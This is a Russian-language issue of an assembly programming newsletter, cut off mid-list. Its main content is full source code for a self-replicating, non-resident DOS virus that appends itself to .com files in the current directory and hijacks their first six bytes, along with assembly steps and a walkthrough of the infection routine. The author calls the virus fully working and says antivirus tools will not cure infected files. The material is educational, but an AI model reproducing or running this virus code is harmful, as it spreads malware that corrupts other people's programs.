<HTML lang="ru"><HEAD> 
<title>Калашников.ru - Ассемблер? Это просто!.. (Выпуск № 020)</title>
<STYLE><!-- a:link, a:visited, a:active { text-decoration: none; color: #226622} 
a:hover { text-decoration: bold; color: #662266; } 
 .ff { 
font-family : Arial, helvetica, sans-serif; 
font-style : normal; 
font-variant : normal; 
} --></STYLE>
</HEAD><BODY body bgcolor=#CFE7E7>

<div align="center"><center>

<table border="1" cellpadding="0" cellspacing="0" width="100%"
bgcolor="#CDCD9C">
<tr>
<td colspan="3" width="100%"><p align="center"><font
color="#004080" size="5"><em><strong>Ассемблер?
Это просто! Учимся
программировать</strong></em></font><font
color="#000000" size="2"><br>
______________________________________</font></p>
<p align="center"><font color="#000000" size="4">Выпуск
N 020 </font><font size="4">(<a href="#virus">Вирус</a>)</font></p>
</td>
</tr>
</table>
</center></div>

<p align="left"><font color="#000000" size="4"><strong>Сегодня
в рассылке:</strong></font></p>

<dir type="disc">
<li><p align="left"><a href="#letters">Ваши письма</a></p>
</li>
<li><p align="left"><a href="#virus">Вирус готов!</a></p>
</li>
<li><p align="left"><a href="#afterwords">Послесловие.
Пофилософствуем?</a></p>
</li>
</dir>

<hr>

<br>
<div align="center"><center>

<table border="0" cellpadding="0" cellspacing="0" width="100%"
bgcolor="#9CCDCD">
<tr>
<td align="center" width="100%"><a name="letters"><font
color="#004080" size="5"><strong>Ваши письма</strong></font></a></td>
</tr>
</table>
</center></div>

<p>Друзья мои! Не ожидал я, что получу
порядка 300 поздравлений с Новым
годом! Огромное вам всем СПАСИБО!
Читая многие письма, я даже
прослезился! Честное слово! Очень
приятно! Я могу в свою очередь
поздравить всех вас с Рождеством.
Хоть и прошедшим, но все-таки...</p>

<p>Сегодня у нас юбилейный,
двадцатый выпуск. Я рад, что мы
все-таки дошли до этого номера.
Надеюсь, что вместе мы пойдем и
дальше. Дойдем до сотен.
Представьте, &quot;Выпуск N 126
(Вырисовывается силуэт
браузера)&quot;... Да... Размечтался...</p>

<p align="center">_____________</p>

<p>Я до сих пор получаю много писем с
вопросами типа: &quot;Будем ли мы
проходить инструкции MMX и т.п.?&quot;
Конечно, будем! После того, как
закончим DOS, возьмемся за Windows, где и
рассмотрим все прелести
процессоров Pentium. По крайней мере, я
надеюсь...</p>

<p>Еще раз повторю: некоторые подписчики с нетерпением ждут
программирования на Ассемблере под
Windows. Но основная часть нашего
коллектива незнакома с DOS. Я считаю,
что целесообразней будет пройти DOS,
так сказать, &quot;чувствовать себя в
ней, как рыба в воде&quot;. После этого
преспокойненько начнем
программировать под Windows. Я даже
пока строю планы по объединению
двух рассылок: программирование на
языках высокого уровня, как то: C++,
Pascal и пр. и нашей по Ассемблеру.</p>

<p>Возможно, как перейдем к Windows, у
нашей рассылки появятся соведущие.
Т.е. рассылку будут вести 2-3
человека на равных правах. Появится
больше обсуждений, споров,
различных дискуссий и пр. Сейчас вы
в основном учитесь писать
программы по тем алгоритмам,
которые я вам преподношу.
Естественно, они не всегда
оптимальны на 100%. Ведь одну и ту же
задачу можно решить несколькими
способами. Не так ли? Думаю, что мы
сделаем на сайте доску обсуждений,
где каждый сможет оставить для
всеобщего обозрения свое решение
той или иной задачи, алгоритм,
программу и т.д. Хорошо, что я теперь
могу использовать CGI, SSI и проч. Как
вы думаете, интересно будет? <a
href="mailto:Assembler@Kalashnikoff.ru">А что еще вы
можете предложить?</a></p>

<hr>

<p><font color="#000000" size="2"><br>
</font></p>
<div align="center"><center>

<table border="0" cellpadding="0" cellspacing="0" width="100%"
bgcolor="#9CCDCD">
<tr>
<td align="center" width="100%"><a name="virus"><font
color="#004080" size="5"><strong>Вирус</strong></font></a></td>
</tr>
</table>
</center></div>

<p>&nbsp;</p>

<p align="center"><font size="4"><!--webbot bot="Validation"
b-value-required="TRUE" i-minimum-length="1" i-maximum-length="80" --><textarea name="Virus" rows="13"
cols="68">

;              VIRUS20.ASM - программа к рассылке № 020

; (С) Авторское право принадлежит подписчикам рассылки "Ассемблер? Это просто! Учимся программировать"
; Автор рассылки: Калашников Олег Александрович (e-mail: Assembler@Kalashnikoff.ru)
;                 http://www.Klashnikoff.ru

; --- Ассемблирование (получение *.com файла) ---
;При использовании MASM:
;ML.EXE virus20.asm /AT

;При использовании TASM:
;TASM.EXE virus20.asm
;TLINK.EXE virus20.obj /t/x

;______________________________________________________

.286

CSEG segment
assume cs:CSEG, ds:CSEG, es:CSEG, ss:CSEG
org 100h

Begin:
       push offset Init  ;3 байта
       ret               ;1 байт
 dw 1122h                ;2 байта (метка, указывающая, что файл уже заражен)
;                        ---------
;ИТОГО:                   6 байт

F_bytes equ $-offset Begin ;Длина первых шести байт "файла-жертвы"

;       === Процедуры работы с файлами ===

; --- Открытие файла для записи ---
; Вход:  DX - путь файлу ASCIZ
; Выход: Handle, BX - номер файла
Open_file proc
     mov ax,3D02h ;открываем файл для чтения/записи
     mov dx,1Eh   ;DX указывает на имя найденного файла в DTA
     int 21h
     mov Handle,ax ;сохраняем номер файла
     mov bx,ax
     ret

Handle dw 0FFFFh ;переменная для хранения номера файла
Open_file endp

; --- Закрытие файла ---
; Вход:  Handle - номер открытого файла
; Выход: ничего
Close_file proc
     cmp Handle,0FFFFh ;нет открытых файлов?
     je No_close       ;тогда выходим (закрывать нечего!)

     mov bx,Handle     ;закрываем файл...
     mov ah,3Eh
     int 21h

No_close:
   ret
Close_file endp

; --- Поиск первого файла ---
Find_first proc
      mov ah,4Eh ;ищем первый файл по маске (Mask_file)
      xor cx,cx  ;атрибуты обычные (CX=0)
      mov dx,offset Mask_file ;адрес маски в DS:DX
      int 21h  ;теперь имя файла находится по адресу 0BF00:001Eh

   ret
Mask_file db '*.com',0 ;маска для поиска (только COM-файлы)
Find_first endp

; --- Поиск следующих файлов ---
Find_next proc
      xor dx,dx ;DS:DX указывают на DTA
      xor cx,cx ;Атрибуты обычные
      mov ah,4Fh
      int 21h ;Теперь в DTA находится информация о следующем найденном файле
   ret
Find_next endp

; --- Заражение файла ---
Infect_file proc
;Основная процедура заражения найденного файла.
;Будем следить за тем, что происходит с "файлом-жертвой".

;Допустим, заражаем такой файл (естественно, com-файл, а не asm!):

;г=======================T=============T=====================================¬
;¦Ассемблер              ¦Машинные коды¦Пояснения                            ¦
;¦-----------------------+-------------+-------------------------------------¦
;¦mov ah,9               ¦B4 09        ¦B4-загрузка в AH, 09-что грузим      ¦
;¦mov dx,offset Message  ¦BA 0801      ¦BA-загрузка в DX, 0801-смещ. строки  ¦
;¦int 21h                ¦CD 21        ¦CD-int                               ¦
;¦                       ¦             ¦                                     ¦
;¦ret                    ¦C3           ¦                                     ¦
;¦...                    ¦     ...     ¦Еще какие-то данные/коды             ¦
;L=======================¦=============¦=====================================-

      mov ax,cs:[1Ch]  ;Получим второе слово длины заражаемого файла
      or ax,ax         ;Если оно не равно 0, то выходим...
      jnz Error_infect ;...это значит, что размер файла больше 64Кб.

      mov bp,cs:[1Ah]  ;Получим младшее слово (т.е. размер файла)

      call Open_file   ;Открываем файл
      jc Error_infect  ;Ошибка - на выход

      mov ah,3Fh
      mov cx,F_bytes   ;Читаем первые шесть байт "файла-жертвы"
      mov dx,offset Finish ;В хвост нашего вируса
      int 21h
      jc Error_infect

;г=======================T=============T=====================================¬
;¦Ассемблер              ¦Машинные коды¦Пояснения                            ¦
;¦-----------------------+-------------+-------------------------------------¦
;¦->mov ah,9             ¦B4 09        ¦Читаем байты этой команды...         ¦
;¦->mov dx,offset Message¦BA 0801      ¦И этой...                            ¦
;¦->int                  ¦CD           ¦И один байт этой.                    ¦
;¦...                    ¦     ...     ¦Другие данные/коды (НЕ читаем!)      ¦
;L=======================¦=============¦=====================================-
;DX указывает на буфер, куда прочитали эти байты.
;Если файл заражен, то 4 и 5 байты будут равны 2211h (перевернуты наоборот)

;Проверим это, чтобы 2 раза не заражать один и тот же файл...

      mov bx,dx
      cmp word ptr [bx+4],1122h ;Проверим на то, заражен ли уже этот файл
      je Error_infect ;Если да, то - на выход...

      mov ax,4202h   ;Установим указатель чтения/записи на конец файла.
      mov bx,Handle
      xor cx,cx      ;Отсчитывать 0 байт...
      xor dx,dx
      int 21h
      jc Error_infect

      mov ah,40h    ;В BX уже есть номер файла.
      mov cx,offset Finish-100h-F_bytes ;Пишем в хвост "файла-жертвы"
      mov dx,100h                       ;тело вируса.
      int 21h
      jc Error_infect

;Ситуация теперь такая:
;г=======================T=============T=====================================¬
;¦Ассемблер              ¦Машинные коды¦Пояснения                            ¦
;¦-----------------------+-------------+-------------------------------------¦
;¦mov ah,9               ¦B4 09        ¦B4-загрузка в AH, 09-что грузим      ¦
;¦mov dx,offset Message  ¦BA 0801      ¦BA-загрузка в DX, 0801-смещ. строки  ¦
;¦int 21h                ¦CD 21        ¦CD-int                               ¦
;¦                       ¦             ¦                                     ¦
;¦ret                    ¦C3           ¦                                     ¦
;¦...                    ¦     ...     ¦Еще какие-то данные/коды             ¦
;¦Здесь идет наш вирус   ¦     ...     ¦                                     ¦
;L=======================¦=============¦=====================================-

      mov ah,40h    ;После тела вируса дописываем первые настоящие шесть байт
      mov cx,F_bytes ;"файла-жертвы"...
      mov dx,offset Finish
      int 21h
      jc Error_infect

;Получаем:
;г=======================T=============T=====================================¬
;¦Ассемблер              ¦Машинные коды¦Пояснения                            ¦
;¦-----------------------+-------------+-------------------------------------¦
;¦mov ah,9               ¦B4 09        ¦B4-загрузка в AH, 09-что грузим      ¦
;¦mov dx,offset Message  ¦BA 0801      ¦BA-загрузка в DX, 0801-смещ. строки  ¦
;¦int 21h                ¦CD 21        ¦CD-int                               ¦
;¦                       ¦             ¦                                     ¦
;¦ret                    ¦C3           ¦                                     ¦
;¦...                    ¦     ...     ¦Еще какие-то данные/коды             ¦
;¦                       ¦             ¦                                     ¦
;¦Здесь идет наш вирус   ¦     ...     ¦                                     ¦
;¦mov ah,9               ¦B4 09        ¦                                     ¦
;¦mov dx,offset Message  ¦BA 0801      ¦                                     ¦
;¦int                    ¦CD           ¦                                     ¦
;L=======================¦=============¦=====================================-
;Шесть байт дописали в файл прямо за кодом вируса.

      call Close_file ;Закрываем файл.

      add bp,offset Init ;К длине файла прибавляем смещение метки Init
      mov ss:[101h],bp   ;Заносим полученный адрес после push

      call Open_file  ;Открываем файл. Теперь указатель в начале...

      mov ah,40h      ;Запишем первые шесть байт (переход на вирус)
      mov cx,F_bytes  ;поверх уже имеющихся...
      push ss         ;Пишем с сегмента "файла-жертвы"
      pop ds
      mov dx,100h
      int 21h

;г=======================T=============T=====================================¬
;¦Ассемблер              ¦Машинные коды¦Пояснения                            ¦
;¦-----------------------+-------------+-------------------------------------¦
;¦push адрес вируса      ¦68 адрес     ¦Адрес занимает 2 байта               ¦
;¦ret                    ¦С3           ¦                                     ¦
;¦1122h                  ¦1122         ¦Указатель на то, что файл уже заражен¦
;¦and ax,bx              ¦21C3         ¦Вот такая картина...                 ¦
;¦...                    ¦     ...     ¦Еще какие-то данные/коды             ¦
;¦                       ¦             ¦                                     ¦
;¦Здесь идет наш вирус   ¦     ...     ¦Этот адрес толкает в стек push       ¦
;¦mov ah,9               ¦B4 09        ¦                                     ¦
;¦mov dx,offset Message  ¦BA 0801      ¦                                     ¦
;¦int                    ¦CD           ¦                                     ¦
;L=======================¦=============¦=====================================-

      push cs
      pop ds
      call Close_file ;Закрываем файл

      clc  ;Сигнал успешного заражения...
      ret

Error_infect:
      call Close_file ;Закрываем файл
      stc ;Сигнал того, что произошла ошибка при заражении.
   ret
Infect_file endp



; === Процедура инициализации вируса ===
Init:
       pusha       ;Сохраним все регистры в стеке

       call Get_IP ;Получим смещение, где мы сейчас находимся
Get_IP:
       pop ax      ;Теперь в AX - смещение
       sub ax,offset Get_IP ;Вычтем из него реальный адрес, где мы будем
                            ;находиться в сегменте 0BF00h
                            ;Получим размер файла-"жертвы", если его нет
                            ;(т.е. мы запускаем вирус первый раз),
                            ;то AX будет равен 0

       push 0BF00h
       pop es       ;ES - сегмент, куда будем перемещать код вируса.

       mov di,offset Open_file ;DI - смещение (адрес самой первой процедуры)
       mov si,di
       add si,ax ;SI должен содержать РЕАЛЬНЫЙ адрес (смещение), т.к. мы
                 ;пока еще в сегменте "файла-жертвы"...

       mov cx,offset Finish-offset Open_file ;CX = длина нашего вируса
       rep movsb  ;Теперь в памяти две копии вируса

;Занесем в стек смещение (Lab_return+AX) и сегмент (CS) возврата из копии...
       mov bx,offset Lab_return
       add bx,ax ;Как бы искусственно заносим адрес возврата для retf
       push cs
       push bx

;Занесем в стек адрес для перехода в нашу копию:
;  * сегмент - 0BF00h
;  * смещение - Lab_jmp
       mov bx,offset Lab_jmp ;Аналогично вышесказанному...
       push 0BF00h
       push bx

;Теперь перейдем на метку Lab_jmp, расположенную в сегменте 0BF00h.
       retf


; Теперь мы уже в области экрана
Lab_jmp:
       ;CS теперь равен 0BF00h.

       push cs ;настроим регистр DS
       pop ds

       mov ah,1Ah ;установим DTA для поиска файлов
       xor dx,dx  ;он устанавливается на тот адрес, который содержится
       int 21h    ;в регистрах DS:DX. В отладчике смотрите,
                  ;что находится в памяти на которую указывают данные
                  ;регистры, т.е. DS:DX...

       call Find_first ;ищем первый файл
       jc Nomore_files ;нет COM-файлов в текущем каталоге - на выход

Inf_file:
       call Infect_file ;нашли - пробуем заразить
       jnc Nomore_files ;удалось заразить - выходим

       call Find_next ;не удалось заразить - ищем следующий
       jnc Inf_file   ;нашли еще один COM-файл; пробуем заразить...


;Восстановим первые шесть байт файла-жертвы в памяти
;Вот, что мы имеем до восстановления байт:
;г=======================T=============T=====================================¬
;¦Ассемблер              ¦Машинные коды¦Пояснения                            ¦
;¦-----------------------+-------------+-------------------------------------¦
;¦push адрес вируса      ¦68 адрес     ¦Адрес занимает 2 байта               ¦
;¦ret                    ¦С3           ¦                                     ¦
;¦1122h                  ¦1122         ¦Указатель на то, что файл уже заражен¦
;¦and ax,bx              ¦21C3         ¦Вот такая картина...                 ¦
;¦...                    ¦     ...     ¦Еще какие-то данные/коды             ¦
;¦                       ¦             ¦                                     ¦
;¦Здесь идет наш вирус   ¦     ...     ¦                                     ¦
;¦Init:                  ¦     ---     ¦Этот адрес толкает в стек push       ¦
;¦                       ¦             ¦                                     ¦
;¦->mov ah,9             ¦B4 09        ¦Вот эти байты нужно...               ¦
;¦->mov dx,offset Message¦BA 0801      ¦...переместить по адресу...          ¦
;¦->int                  ¦CD           ¦...100h, чтобы восстановить файл     ¦
;L=======================¦=============¦=====================================-
;Примечание. Init: - метка инициализации вируса. См. ниже.

Nomore_files:
      mov si,offset First_bytes ;DS:SI - на массив из шести байт
      mov di,100h ;ES:DI - куда перемещать строку (шесть байт)
      push ss     ;ES должен указывать на сегмент "файла-жертвы"
      pop es
      mov cx,F_bytes ;6 байт перемещаем: DS:SI = ES:DI
      rep movsb

;Вот, что получили после перемещения шести байт "файла-жертвы":
;г=======================T=============T=====================================¬
;¦Ассемблер              ¦Машинные коды¦Пояснения                            ¦
;¦-----------------------+-------------+-------------------------------------¦
;¦mov ah,9               ¦B4 09        ¦Эта строка находится по адресу 100h  ¦
;¦mov dx,offset Message  ¦BA 0801      ¦                                     ¦
;¦int 21h                ¦CD 21        ¦                                     ¦
;¦                       ¦             ¦                                     ¦
;¦ret                    ¦C3           ¦                                     ¦
;¦...                    ¦     ...     ¦Еще какие-то данные/коды             ¦
;¦                       ¦             ¦                                     ¦
;¦Здесь идет наш вирус   ¦     ...     ¦                                     ¦
;¦mov ah,9               ¦B4 09        ¦                                     ¦
;¦mov dx,offset Message  ¦BA 0801      ¦                                     ¦
;¦int                    ¦CD           ¦                                     ¦
;L=======================¦=============¦=====================================-
;Осталось только передать управление на адрес 100h.

;Вернемся в сегмент программы-"жертвы", т.е. туда, где мы
;были изначально.
       retf


; Теперь мы опять в сегменте зараженной программы
Lab_return:
       push cs ;восстановим DS (ES уже в порядке!)
       pop ds

       mov ah,1Ah ;восстановим DTA
       mov dx,80h
       int 21h

       popa       ;Восстановим регистры

;!!! Передаем управление "файлу-жертве" !!!
       push 100h  ;Обратите внимание, как мы теперь переходим...
       ret        ;...на адрес 100h.


; === Данные ===
;Здесь (First_bytes) будут храниться первые байты "файла-жертвы".
;Если это первый запуск вируса, то по умолчанию получим:
;nop (90h)
;nop (90h)
;nop (90h)
;nop (90h)
;int 20h (0CDh, 20h)
;Итого: 6 байт

;Первые шесть байт зараженного файла будут такими:
;1 - push (68h)
;2,3 - адрес метки инициализации вируса
;4 - ret (0C3h)
;5,6 - заражен ли файл уже (1122h)?
First_bytes db 4 dup (90h), 0CDh, 20h

Finish equ $

CSEG ends
end Begin

</textarea></font></p>

<p>&nbsp;</p>

<p><strong>Как переписать
файл-приложение в текстовый файл
формата DOS?</strong></p>

<ul>
<li><em>отметьте &quot;мышкой&quot; все,
что находится в приведенном
выше окне (правая кнопка
&quot;мыши&quot; ---&gt; Выделить все
(Select all));</em></li>
<li><em>нажмите Ctrl+Insert;</em></li>
<li><em>запустите DOS Navigator, Norton Commander,
Volcov Commander или FAR;</em></li>
<li><em>нажмите Shift+F4;</em></li>
<li><em>введите имя файла VIRUS20.ASM;</em></li>
<li><em>нажмите Shift+Insert;</em></li>
<li><em>нажмите F2;</em></li>
<li><em>выходите в DOS и
ассемблируйте!</em></li>
</ul>

<p>Вы готовы в юбилейном выпуске
научиться заражать другие
программы? Время пришло. Теперь наш
вирус полностью работоспособен.
Будьте осторожны! Случайно заразив
нужный файл, вам придется провести
некоторое время, чтобы вылечить его
вручную. Сразу предупреждаю: мы
пока антивирус не написали. У меня
его тоже нет. Так что, будьте
предельно внимательны!</p>

<p><strong>Несколько слов о вирусе </strong><font
size="4"><strong><u>(прочтите, прежде чем
запускать вирус!)</u></strong></font><strong>:</strong></p>

<p>1) Вирус нерезидентный. Это значит,
что заражать он будет программы
только, если запустить зараженный
com-файл. <u>В памяти ничего не
остается!</u></p>

<p>2) Вирус не делает ничего, кроме
как заражает файлы.</p>

<p>3) Ни один антивирус не вылечит
файл, зараженный нашим вирусом! Так
что, не надейтесь ни на Dr. Web, ни на
что-либо еще...</p>

<p>4) Вирус заражает <strong><u>только
*.com-файлы в текущем каталоге</u></strong>.
Что это значит? Допустим, в каталоге
c:\assm есть следующие файлы:<font
color="#000000" size="2"><br>
</font>1. test.com<font color="#000000" size="2"><br>
</font>2. dn.com<font color="#000000" size="2"><br>
</font>3. nc.exe<font color="#000000" size="2"><br>
</font>причем, test.com заражен нашим
вирусом. Запуская test.com на
выполнение, он заражает dn.com.
Запустив затем dn.com, вирус ничего не
заразит, т.к. в данном каталоге
больше нет незараженных нашим
вирусом *.com-файлов.</p>

<p><strong>НО!</strong> Если у вас в path (в
autoexec.bat) стоит путь к каталогу c:\assm,
то, запустив test.com с текущего
каталога, скажем, c:\nc, наш вирус
заразит первый встречный com-файл в
каталоге c:\nc. <strong><u>Будьте
осторожны!!!</u></strong></p>

<p>Если все же произошла беда, и вы не
знаете, как удалить вирус,
заразивший весь компьютер, то
срочно напишите мне письмо. Я
объясню, как восстановить
зараженный файл. Хотя, если перед
тем, как запускать virus20.com на
выполнение, вы прочтете описания к
нему и разберетесь во всем, то труда
восстановить зараженный файл у вас
не составит. Если будет время, то я
выложу на сайт на головной странице
антивирус (на всякий случай. А вдруг
кому пригодится?). А вообще сами
сможете написать антивирус?
Конечно! Буду рад ознакомиться с
вашим творчеством. <a
href="mailto:Assembler@Kalashnikoff.ru">Присылайте
варианты!</a></p>

<p>5) *.Com-файлы, расположенные в
каталоге c:\windows\command, после
заражения отказываются работать
корректно. С чем это связано - не
совсем понятно. Сжав эти файлы Pklite,
результат был тот же (т.е.
неправильное определение
командной строки). Скорее всего, они
подсчитывают контрольную сумму или
еще чего-то... Может, кто знает -
напишите. Мне нет времени
разбираться. Для экспериментов
придется искать другие *.com-файлы.</p>

<p>6) Как вы думаете, зачем мы изучали
работу отладчика в 16 выпуске? Дело в
том, что если вы будете исследовать
работу вируса в отладчике, то
столкнетесь с одной проблемой.
Записав вирус в файл, используя
отладчик, вы с удивлением заметите,
что зараженный файл работать не
будет. Почему? Вспомните, что
отладчик вставляет INT 3 (0CCh). Для чего
мы проходили это? Думайте,
вспоминайте...</p>

<p>В последующих выпусках мы напишем
антивирус, а также я придумаю,
чтобы такое нехорошее, безобидное,
но интересное и прикольное делать
нашему вирусу.</p>

<p align="center">___________</p>

<p>Теперь ближе к делу.</p>

<p>Вопрос: <strong>можно ли вместо RET и CALL
использовать JMP? А вместо JMP - RET?</strong></p>

<p>Конечно, можно! Вот простейшие
примеры:</p>
<div align="center"><center>

<table border="1" cellpadding="0" cellspacing="0" width="100%"
bgcolor="#A3D1D1">
<tr>
<td valign="top" width="20%"><strong>Команда</strong></td>
<td valign="top" width="20%"><strong>Альтернатива</strong></td>
<td valign="top" width="34%"><strong>Примечание</strong></td>
</tr>
<tr>
<td valign="top" width="20%">RET</td>
<td valign="top" width="20%">POP AX<font color="#000000"
size="2"><br>
</font><font color="#000000" size="3">JMP AX</font></td>
<td valign="top" width="34%">Вытащим со
стека адрес возврата и
перейдем на него</td>
</tr>
<tr>
<td valign="top" width="20%">CALL PROCED<font
color="#000000" size="2"><br>
</font></td>
<td valign="top" width="20%"><font size="2">MOV BX,OFFSET
LAB_RET</font><font color="#000000" size="2"><br>
PUSH BX<br>
JMP PROCED<br>
LAB_RET:</font>
</td>
<td valign="top" width="34%">Занесем в стек
адрес возврата и &quot;прыгнем&quot;
на метку процедуры</td>
</tr>
<tr>
<td valign="top" width="20%">JMP LABEL1</td>
<td valign="top" width="20%"><font size="2">PUSH OFFSET
LABEL1</font><font color="#000000" size="1"><br>
</font><font size="2">RET</font></td>
<td valign="top" width="34%">Занесем в стек
адрес метки и сымитируем выход
из процедуры</td>
</tr>
</table>
</center></div>

<p>В некоторых случаях бывает
полезно пользоваться
нестандартными командами.</p>

<p>К чему я это говорю? Обратите
внимание, как мы теперь переходим
на метку инициализации вируса (Init):</p>

<p>push offset Init ;3 байта<br>
ret ;1 байт</p>

<p>Ну и зачем? Дело в том, что так
будет нам удобней менять адрес
метки Init в зараженных файлах.
Читайте ниже - будет понятно.</p>

<p><strong>Как происходит заражение
файла?</strong><font color="#000000" size="2"><br>
</font><strong>Как выглядит
&quot;файл-жертва&quot; после заражения?</strong></p>

<p>Заражение файла происходит
следующим образом (смотрите
процедуру Infect_file). Опустим поиск
файлов. Будем считать, что файл уже
найден. Осталось только проверить
его длину:</p>

<p>mov ax,cs:[1Ch] <em>;Получим второе слово
длины заражаемого файла</em><br>
or ax,ax<em> ;Если оно не равно 0, то
выходим...</em><br>
jnz Error_infect <em>;...это значит, что размер
файла больше 64Кб.</em><br>
mov bp,cs:[1Ah] <em>;Получим младшее слово
(т.е. размер файла)</em></p>

<p><strong>Зачем мы проверяем длину
com-файла, если известно, что com-файлы
не могут быть больше 64Кб?</strong> Дело
в том, что DOS определяет какой тип
файла запускается не по расширению,
а по его первым двум байтам
содержимого файла. Если это &quot;MZ&quot;
или &quot;ZM&quot;, то файл - EXE, иначе - COM.
Можете проверить... Таким образом,
ничего не мешает любому
пользователю переименовать файл,
например, test.exe длиной 450Кб в test.com. DOS
все равно определит, что это EXE-файл
по первым двум байтам.</p>

<p>Примером может служить COMMAND.COM,
который в DOS 7.0 занимает 95Кб.
Расширение COM оставили для
совместимости с программами,
написанными в более старых версиях
DOS.</p>

<p>Так что же получится, если мы
попробуем заразить тот же COMMAND.COM,
который по сути является COMMAND.EXE? Да
ничего! Мы просто его испортим! Т.е.
он перестанет работать вообще. Вот,
собственно, для этого и следует
проверить размер на то, что он
меньше 64Кб.</p>

<p>Обратите внимание, как мы это
делаем. После того, как функция 4Fh
(4Eh) нашла файл, в DTA по смещению 1Ah
заносится размер файла. Т.к. два
байта могут хранить число до 65.535, то
для определения размера файла
используется два слова. Первое
(смещение 1Ah) - младшая половинка,
второе (смещение - 1Ch) - старшее.
Вспоминаем, что данные в памяти
хранятся наоборот (&quot;задом
наперед&quot;).</p>

<p>Что мы еще не сделали в вирусе, так
это - не проверили первые два
символа (MZ). Зачем? А что, если exe-файл
имеет длину менее 64Кб, но
расширение COM? Такое ведь тоже может
быть... Ну, просто кто-то пошутил...
Надеюсь, что Вы без труда это
сделаете сами.</p>

<p>Следующие шаги:</p>

<ul>
<li>открываем найденный файл на
чтение / запись (3D02h);</li>
<li>читаем первые шесть байт его
(3Fh);</li>
<li>проверяем, заражен ли этот файл
нашим вирусом уже или еще нет.</li>
</ul>

<p>Здесь остановимся ненадолго. В
нашем примере мы используем т.н.
сигнатуру 1122h для определения того,
заражен ли найденный файл нашим
вирусом или нет. Эта сигнатура
должна быть расположена по
смещению +4 от начала файла.
Обратите внимание, что мы проверяем</p>

<p>cmp word ptr [bx+4],1122h</p>

<p>а в файле 1122h будут располагаться наоборот: 2211h. Вот вам еще одно
подтверждение того, что данные в
компьютере хранятся &quot;задом
наперед&quot;.</p>

<p>А что, если в каком-то
незараженном файле по смещению +4 от
начала уже есть такие строки?
Получается, что мы посчитаем, что
файл уже заражен? Да. Но как вы
думаете, какова вероятность того,
что эта сигнатура будет находиться
в файле по такому смещению?
Возможно, даже еще и файла-то такого
нет... Но если вы все равно
сомневаетесь, то можете сделать
сигнатуру более длинной. Например, 6
байт. Это уже дело времени...</p>

<p>Итак, проверили... Затем
устанавливаем указатель файла на
конец файла. Будем дописывать в
хвост файла наш вирус.</p>

<p>Как вы уже заметили, мы используем
функцию 4202h для перемещения
указателя на конец файла. Вот,
рассмотрим эту функцию:</p>

<p><strong>Функция 4202h прерывания 21h:
установка указателя на конец файла.</strong></p>
<div align="left">

<table border="1" cellpadding="0" cellspacing="0" width="70%"
bgcolor="#A3D1D1">
<tr>
<td valign="top" width="15%"><font size="4"><strong>Вход:</strong></font></td>
<td valign="top" width="45%" bgcolor="#B6DADA">AX=4202h<br>
BX=номер файла<br>
CX, DX = количество байт, которые необходимо отсчитать от конца
файла и установить на них
указатель.</td>
</tr>
<tr>
<td valign="top" width="15%"><font size="4"><strong>Выход:</strong></font></td>
<td valign="top" width="45%" bgcolor="#B6DADA">JC -
ошибка</td>
</tr>
</table>
</div>

<p>Если в регистрах CX и DX мы укажем 0,
то указатель будет установлен
сразу за последним байтом файла.
Пока нас это только интересует.
Указатель - только для DOS. Он служит
для указания ОС из какого места
читать или в какое место писать
байт(ы). Если указатель не
переместить на конец файла, то,
записав тело вируса, мы затрем файл,
начиная со смещения 7.</p>

<p><strong>Запомните, что:</strong></p>

<ul>
<li>при открытии файла указатель
устанавливается на начало
файла автоматически. Если
указатель установлен где-то на
середину файла, то, закрыв файл,
а затем обратно открыв его, то
указатель установится на
начало файла.</li>
<li>при чтении файла указатель
перемещается на количество
прочитанных байт. Т.е. если файл
имеет длину 3.000 байт, то
прочитав 1.500 байт, указатель
переместится на середину
файла.</li>
</ul>

<p>Все просто!</p>

<p>В нашем примере мы устанавливаем
на конец файла указатель, чтобы
записать наш вирус в &quot;хвост&quot;
&quot;файла-жертвы&quot;.</p>

<p>Итак, это сделали. Теперь можем и записывать
вирус в &quot;хвост&quot;,
используя известную уже вам
функцию 40h. Интересно, а вы сможете
разобраться с этой строкой:</p>

<p>mov cx,offset Finish-100h-F_bytes</p>

<p>Сколько байт мы будем записывать
и почему именно столько?</p>

<p>Записали. Теперь можно сказать,
что файл уже заражен. Его размер
увеличился на длину нашего файла.
Чего не хватает?</p>

<p>Если мы запустим зараженный файл,
то наш вирус не получит управления.
Почему? А вы не поняли? Мало ли,
какой чуши записано в конце файла.
Эта &quot;чушь&quot; ведь не получает
управление! А как сделать так, чтобы
наш вирус первый получил
управление? Нужно первые байты
&quot;файла-жертвы&quot; (начинающиеся с
адреса 100h) заменить на переход на
наш вирус, а затем, как вирус
отработает, восстановить эти байты
в памяти и &quot;прыгнуть&quot; по адресу
100h. Вы поняли, о чем речь идет?</p>

<p>Следующий шаг: записываем после
нашего вируса первые шесть байт,
которые мы меняем:</p>

<p>mov ah,40h ;После тела вируса
дописываем первые настоящие шесть
байт<br>
mov cx,F_bytes ;&quot;файла-жертвы&quot;...<br>
mov dx,offset Finish<br>
int 21h</p>

<p>Теперь нам нужно сделать так,
чтобы наш вирус первым получил
управление. Т.е. прежде, чем получит
управление &quot;файл-жертва&quot;, наш
вирус должен получить управление,
отработать, а затем сделать так,
чтобы &quot;файл-жертва&quot;
заработала, не подозревая о том, что
кто-то прежде получил управление.</p>

<p>Для этого необходимо вместо
первых шести байт, которые мы
записали в &quot;хвост&quot; файла после
тела вируса, записать переход на на
метку Init. Т.о. при запуске файла наш
вирус первый получит управление,
отработает, восстановит в памяти
первые шеть байт и передаст
управление &quot;файлу-жертве&quot;.</p>

<p>Заменяем первые шесть байт на
диске. А как? Но мы ведь получили
размер файла. Его храним в регистре
BP (см. примечания в
файле-приложении). Сделаем таким
образом:</p>

<p>push <em>адрес перехода на метку Init</em><br>
ret</p>

<p>Если файл 3.000 байт, то после PUSH
будет один адрес, а если файл 5.000
байт, то переход будет на другой
адрес. Более подробней смотрите
описание в файле-приложении.</p>

<p>Все! Теперь файл заражен
корректно. При его запуске первым
получит управление наш вирус.
Осталось восстановить в памяти
первые шесть байт
&quot;файла-жертвы&quot; (мы-то их
сохранили после тела вируса!) и
передать управление по адресу 100h.</p>

<p><strong><u>Итак, общая схема:</u></strong></p>

<ol>
<li>ищем com-файл;</li>
<li>читаем первые шесть байт
найденного файла;</li>
<li>файл больше 64Кб - см. пункт 1;</li>
<li>по смещению +4 от начала файла
находится 1122h? Если да - см.
пункт 1;</li>
<li>пишем в &quot;хвост&quot; найденного
файла тело нашего вируса;</li>
<li>пишем после тела вируса первые
шесть настоящих байт
&quot;файла-жертвы&quot;;</li>
<li>закрываем файл;</li>
<li>создаем искусственный переход
